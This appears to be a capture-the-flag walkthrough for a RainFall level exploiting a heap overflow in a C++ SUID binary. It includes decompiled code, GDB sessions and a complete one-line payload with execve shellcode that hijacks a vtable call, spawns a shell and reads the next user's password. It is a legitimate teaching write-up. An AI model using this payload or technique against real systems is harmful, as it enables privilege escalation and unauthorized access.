# Level 9 Walkthrough

> Goal: abuse a heap overflow in a small C++ program to pivot an indirect call toward shellcode we place in a heap buffer, then read the next user’s password.

---

## Context

**Who am I?**

```bash
level9@RainFall:~$ id
uid=2009(level9) gid=2009(level9) groups=2009(level9),100(users)
```

**Where am I?**

```bash
level9@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9*
```

SUID binary owned by `bonus0`. No output by default; accepts 0–2 args without printing anything visible.

---

## Decompiled View

```c++
class N {
public:
    N(int v) {
        this->vptr  = &VTable;
        this->value = v;
    }

    void setAnnotation(char *s) {
        size_t n = strlen(s);
        memcpy((char*)this + 4, s, n); // dangerous: unchecked copy can overflow into next object
    }

    int operator+(N &o) { return this->value + o.value; }
    int operator-(N &o) { return this->value - o.value; }

    void **vptr;  // vtable pointer at offset 0
    int   value;  // at offset 0x68
};

typedef int (*Fn)(N*, N*);

int main(int ac, char **av) {
    if (ac < 2) exit(1);

    N *a = new N(5);
    N *b = new N(6);

    a->setAnnotation(av[1]);

    // double deref of vptr, then call with (b, a)
    Fn f = *(Fn*)(*(void**)b);
    return f(b, a);
}
```

Key points:

* `setAnnotation` → uses `memcpy` with **no bounds check**, copies user input into the object’s buffer region.
* Later, `main` performs an **indirect call** through a function pointer table. Our overflow can corrupt fields so this pointer chain eventually leads to **attacker-controlled data**.

---

## High-Level Exploit Strategy

* Place **shellcode** directly into the heap buffer allocated for `N`.
* Arrange the first word of that buffer to be a pointer to the shellcode start.
* Overflow further to overwrite the call target slot (offset 108) with the buffer’s address.
* Execution: indirect call dereferences twice → lands in our shellcode.

---

## Finding the Offset (pattern method)

```gdb
(gdb) run 'Aa0Aa1...'
Program received signal SIGSEGV
(gdb) info registers eax
EAX = 0x41366441
```

Pattern offset tool:

```
Exact match at offset: 108
```

So: after **108 bytes** we overwrite the indirect call slot.

---

## Locating the Heap Buffer

Break after the `setAnnotation` call:

```gdb
(gdb) b N::setAnnotation(char*)
Breakpoint 1 at 0x8048714
(gdb) run 'AAAA'
Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 1, 0x08048714 in N::setAnnotation(char*) ()
(gdb) s
Single stepping until exit from function _ZN1N13setAnnotationEPc,
which has no line number information.
0x0804867c in main ()
(gdb) x/wx $eax
0x804a00c:	0x41414141
(gdb) x/wx $eax + 4
0x804a010:	0x00000000
```

* Heap buffer for our string at `0x0804a00c`
* First 4 bytes under our control
* Plan: put a pointer to `0x0804a010` there (the shellcode start)

---

## Step 6: Build the exploit payload

**Shellcode (28 bytes)**: execve("/bin//sh") — source: [https://shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)

**Layout**

```
[shell_ptr (4)] [shellcode (28)] [padding (76)] [buf_addr (4)]
```

* `shell_ptr = buf + 4` (pointer to the start of shellcode inside the same heap buffer)
* `buf_addr = buf` (address used to overwrite the indirect call slot at offset 108)

**One‑liner**

```bash
level9@RainFall:~$ ./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08")')
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## **Files in this repository**

* `flag.txt`: file containing the retrieved flag
* `asm_analysis.md`: GDB analysis of the binary
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C, faithful to binary)

---

---

## Conclusion

This level showcases a practical heap‑based control‑flow hijack. Instead of stack tricks, we overflow the annotation region of one object to overwrite the adjacent object’s vtable pointer. By placing shellcode in the same heap buffer and storing a pointer to it at the head of that buffer, the program’s final double‑indirect call is redirected into our code, yielding a shell and the flag.

